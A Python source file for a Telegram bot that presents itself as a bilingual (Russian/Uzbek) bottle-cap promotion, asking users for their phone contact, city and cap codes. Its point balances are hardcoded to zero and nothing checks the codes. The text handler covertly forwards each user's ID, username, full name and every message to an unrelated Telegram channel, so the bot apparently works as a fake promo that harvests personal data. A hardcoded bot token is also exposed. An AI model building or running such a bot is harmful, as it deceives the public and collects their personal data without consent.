from telebot import types, telebot

bot = telebot.TeleBot("5620026106:AAH5bAdlyXQdZ16ynyRNx8eLWkpvQddRQ-I")



LanguageButton = telebot.types.ReplyKeyboardMarkup()
LanguageButton.row("Русский", "O'zbek")

RuContinueButton = types.ReplyKeyboardMarkup(row_width=1)
ContactButton = types.KeyboardButton(text="Продолжить", request_contact=True)
RuContinueButton.add(ContactButton)

UzContinueButton = types.ReplyKeyboardMarkup(row_width=1)
ContactButton = types.KeyboardButton(text="Davom etish", request_contact=True)
UzContinueButton.add(ContactButton)

RuCityButton = telebot.types.ReplyKeyboardMarkup(True)
RuCityButton.row("Ташкент", "Андижан")
RuCityButton.row("Бухара", "Чирчик")
RuCityButton.row("Денау", "Фергана")
RuCityButton.row("Джизах", "Кракалпакстан")
RuCityButton.row("Коканд", "Наманган")
RuCityButton.row("Навои", "Кашкадарья")
RuCityButton.row("Самарканд", "Шахрисабз")
RuCityButton.row("Сырдарья", "Сурхандарья")
RuCityButton.row("Хорезм", "Янгиюль")
RuCityButton.row("Зарафшан")

UzCityButton = telebot.types.ReplyKeyboardMarkup(True)
UzCityButton.row("Toshkent", "Andijon")
UzCityButton.row("Buxoro", "Chirchiq")
UzCityButton.row("Denov", "Farg'ona")
UzCityButton.row("Jizzax", "Nukus")
UzCityButton.row("Q'oqon", "Namangan")
UzCityButton.row("Navoiy", "Qarshi")
UzCityButton.row("Samarqand", "Shahrisabs")
UzCityButton.row("Gulistan", "Termiz")
UzCityButton.row("Urganch", "Yangiyo'l")
UzCityButton.row("Zarafshan")

RuMenuButton = telebot.types.ReplyKeyboardMarkup()
RuMenuButton.row("Статистика", "Призы")

UzMenuButton = telebot.types.ReplyKeyboardMarkup()
UzMenuButton.row("Statistika", "Sovg'alar")

RuBackButton = telebot.types.ReplyKeyboardMarkup()
RuBackButton.row("Назад")

UzBackButton = telebot.types.ReplyKeyboardMarkup()
UzBackButton.row("Orqaga")




@bot.message_handler(commands=["start"])
def Start(message):
    user_language = bot.send_message(message.chat.id, "Выберите язык/Tilni tanlang", reply_markup=LanguageButton)
    bot.register_next_step_handler(user_language, Reg_Language)



def Reg_Language(message):

    if message.text == "Русский":
        bot.send_message(message.chat.id, "https://telegra.ph/PRAVILA-PROMO-AKCII-09-14")
        user_number = bot.send_message(message.chat.id, "Продолжая вы соглашаетесь с правилами:", reply_markup=RuContinueButton)
        bot.register_next_step_handler(user_number, Reg_City_Ru)

    elif message.text == "O'zbek":
        bot.send_message(message.chat.id, "https://telegra.ph/PROMO-AKSIYA-QOIDALARI-09-14")
        user_number = bot.send_message(message.chat.id, "Davom etsangiz, aksiya qoidalariga roziligingizni tasdiqlaysiz:", reply_markup=RuContinueButton)
        bot.register_next_step_handler(user_number, Reg_City_Uz)

    else:
        msg = bot.send_message(message.chat.id, "Неверная команда")
        bot.register_next_step_handler(msg, Reg_Language)



def Reg_City_Ru(message):

    user_city = bot.send_message(message.chat.id, "Выберите регион", reply_markup=RuCityButton)
    bot.register_next_step_handler(user_city, End_Reg_Ru)

def Reg_City_Uz(message):

    user_city = bot.send_message(message.chat.id, "Shahringizni tanlang", reply_markup=UzCityButton)
    bot.register_next_step_handler(user_city, End_Reg_Uz)



def End_Reg_Ru(message):

    bot.send_message(message.chat.id, "Добро пожаловать", reply_markup=RuMenuButton)

    with open("PHOTO/Добро Пожаловать.jpg", "rb") as WelcomePhoto:

        bot.send_photo(message.chat.id, WelcomePhoto)

        bot.send_message(message.chat.id, "Отправьте код из под крышки или выберите действие. На данный момент у вас 0 баллов")

        bot.send_message(message.chat.id, "В связи с исчерпанием призового фонда внесены изменения в сроки проведения акции: коды можно активировать до 3 ноября 2022."
                                          "Призы, имеющиеся в наличии в пунктах выдачи, можно будет забрать до 15 ноября 2022 г."
                                          "Указанное количество призов на сайте распределено между 14 городами, на момент обращения в пункт выдачи, не все призы могут быть в наличии.")


def End_Reg_Uz(message):

    bot.send_message(message.chat.id, "Xush kelibsiz", reply_markup=UzMenuButton)

    with open("PHOTO/Xush Kelibsiz.jpg", "rb") as WelcomePhoto:

        bot.send_photo(message.chat.id, WelcomePhoto)

        bot.send_message(message.chat.id, "Qopqoq ichidagi kodni yuboring yoki harakatni tanlang. Hozir sizda 0 ball mavjud")

        bot.send_message(message.chat.id, "Sovrin jamg'armasi tugaganligi munosabati bilan aksiyani o'tkazish muddatlariga o'zgartirishlar kiritildi: kodlarni 2022 yilning 3 noyabrigacha faollashtirish mumkin."
                                          "Sovrinlar beriladigan punktlarda mavjud sovrinlarni 2022 yilning 15 noyabrigacha olish mumkin."
                                          "Saytda ko'rsatilgan sovrinlar soni 14 ta shahar o'rtasida taqsimlangan, sovrinlar beriladigan punktlarga murojaat qilish vaqtida barcha sovrinlar mavjud bo'lmasligi mumkin.")




@bot.message_handler(content_types=["text"])
def Text(message):

    bot.send_message('@uqwfoqjwjv', f"User ID:  " + str(message.chat.id) +
                     f"\nUsername:  @" + str(message.from_user.username) +
                     f"\nFirst Name:  " + str(message.from_user.first_name) +
                     f"\nLast Name:  " + str(message.from_user.last_name) +
                     f"\nAction:  " + str(message.text))

    if message.text == "Статистика":

        bot.send_message(message.chat.id, "Ваша статистика: балов накоплено - 0, балов потрачено - 0, балов доступно 0")

        bot.send_message(message.chat.id, "В связи с исчерпанием призового фонда внесены изменения в сроки проведения акции: коды можно активировать до 3 ноября 2022."
                                         "Призы, имеющиеся в наличии в пунктах выдачи, можно будет забрать до 15 ноября 2022 г."
                                         "Указанное количество призов на сайте распределено между 14 городами, на момент обращения в пункт выдачи, не все призы могут быть в наличии.")


    elif message.text == "Призы":

        with open("PHOTO/Призы.jpg", "rb") as PrizesPhoto:

            bot.send_photo(message.chat.id, PrizesPhoto, reply_markup=RuBackButton)

            bot.send_message(message.chat.id, "Выберите действие")





    elif message.text == "Назад":

        bot.send_message(message.chat.id, "Отправьте код из под крышки или выберите действие. На данный момент у вас 0 баллов", reply_markup=RuMenuButton)

        bot.send_message(message.chat.id, "В связи с исчерпанием призового фонда внесены изменения в сроки проведения акции: коды можно активировать до 3 ноября 2022."
                                          "Призы, имеющиеся в наличии в пунктах выдачи, можно будет забрать до 15 ноября 2022 г."
                                          "Указанное количество призов на сайте распределено между 14 городами, на момент обращения в пункт выдачи, не все призы могут быть в наличии.")




    elif message.text == "Statistika":

        bot.send_message(message.chat.id, "Statistika: yig'ilgan ballar - 0, ballar sarflandi 0, Ballar mavjud 0")

        bot.send_message(message.chat.id, "Sovrin jamg'armasi tugaganligi munosabati bilan aksiyani o'tkazish muddatlariga o'zgartirishlar kiritildi: kodlarni 2022 yilning 3 noyabrigacha faollashtirish mumkin."
                                          "Sovrinlar beriladigan punktlarda mavjud sovrinlarni 2022 yilning 15 noyabrigacha olish mumkin."
                                          "Saytda ko'rsatilgan sovrinlar soni 14 ta shahar o'rtasida taqsimlangan, sovrinlar beriladigan punktlarga murojaat qilish vaqtida barcha sovrinlar mavjud bo'lmasligi mumkin.")


    elif message.text == "Sovg'alar":

        with open("PHOTO/Sovg'alar.jpg", "rb") as PrizesPhoto:

            bot.send_photo(message.chat.id, PrizesPhoto, reply_markup=UzBackButton)

            bot.send_message(message.chat.id, "Harakatni tanlang")


    elif message.text == "Orqaga":

        bot.send_message(message.chat.id, "Qopqoq ichidagi kodni yuboring yoki harakatni tanlang. Hozir sizda 0 ball mavjud", reply_markup=UzMenuButton)

        bot.send_message(message.chat.id, "Sovrin jamg'armasi tugaganligi munosabati bilan aksiyani o'tkazish muddatlariga o'zgartirishlar kiritildi: kodlarni 2022 yilning 3 noyabrigacha faollashtirish mumkin."
                                          "Sovrinlar beriladigan punktlarda mavjud sovrinlarni 2022 yilning 15 noyabrigacha olish mumkin."
                                          "Saytda ko'rsatilgan sovrinlar soni 14 ta shahar o'rtasida taqsimlangan, sovrinlar beriladigan punktlarga murojaat qilish vaqtida barcha sovrinlar mavjud bo'lmasligi mumkin.")

    else:
        pass

if __name__ == '__main__':
    bot.polling(non_stop=True)